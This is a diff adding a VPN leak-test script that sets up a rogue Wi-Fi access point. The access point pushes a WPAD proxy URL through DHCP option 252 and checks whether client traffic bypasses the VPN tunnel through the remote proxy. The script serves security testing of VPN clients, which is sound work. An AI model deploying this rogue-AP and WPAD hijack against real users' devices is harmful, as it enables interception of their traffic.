@@ -1,0 +1,59 @@
+(*
+ * WPAD attack with remote proxy on the server component.
+ * The server starts a proxy on a random port and generates the PAC file.
+ * Clients receive the PAC file URL via DHCP option 252.
+ *
+ * TrafficMonitor is used to detect whether traffic flows outside the VPN
+ * tunnel to the validation server (via the proxy).
+ *
+ * Configuration:
+ *   - server_secret             : shared secret (must match API_SECRET on server)
+ *   - proxy.server              : URL of the server (e.g. "https://yourserver.com/")
+ *   - mon.validation_server     : URL of the validation server (e.g. "https://yourserver.com/")
+ *   - mon.vpn_endpoints         : VPN endpoints to confirm that VPN is active
+ *   - ap.dhcp4_wpad_url         : URL of the PAC file on the server
+ *)
+
+state init begin:
+  miscnet = miscnet();
+  miscnet.masquerade("true");
+
+  server_secret = "change_this_to_a_long_random_secret";
+
+  proxy = remote_proxy();
+  proxy.server = "https://yourserver.com/";
+  proxy.bring_up(proxy_ready, proxy_err);
+
+state proxy_err:
+  exit("Failed to start proxy: ", errstr);
+
+state proxy_ready:
+  ap = accesspoint();
+  ap.wifi_interface = "wlan0";
+  ap.ipv4_addr = "192.168.137.1";
+  ap.ipv4_netmask = "255.255.255.0";
+  ap.dhcp4_enable = "true";
+  ap.dhcp4_dns = "192.168.137.1";
+  ap.dhcp4_router = "192.168.137.1";
+  ap.dhcp4_wpad_url = "http://yourserver.com/?wpad";
+  ap.dns_enable = "true";
+  ap.bring_up(ap_up, ap_err);
+
+state ap_err:
+  exit("Failed to bring up access point: ", errstr);
+
+state ap_up:
+  mon = trafficmonitor();
+  mon.interface = ap.ap_interface;
+  mon.validation_server = "https://yourserver.com/";
+  mon.vpn_endpoints = "tcp://ams.nl.eduvpn.org:443;udp://ams.nl.eduvpn.org:443";
+  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);
+
+state mon_err:
+  exit("Traffic monitoring error: ", errstr);
+
+state vpn_safe:
+  exit("VPN appears safe: traffic went through the VPN tunnel.");
+
+state vpn_vuln:
+  exit("VPN is vulnerable: traffic went via the WPAD proxy outside the tunnel!");
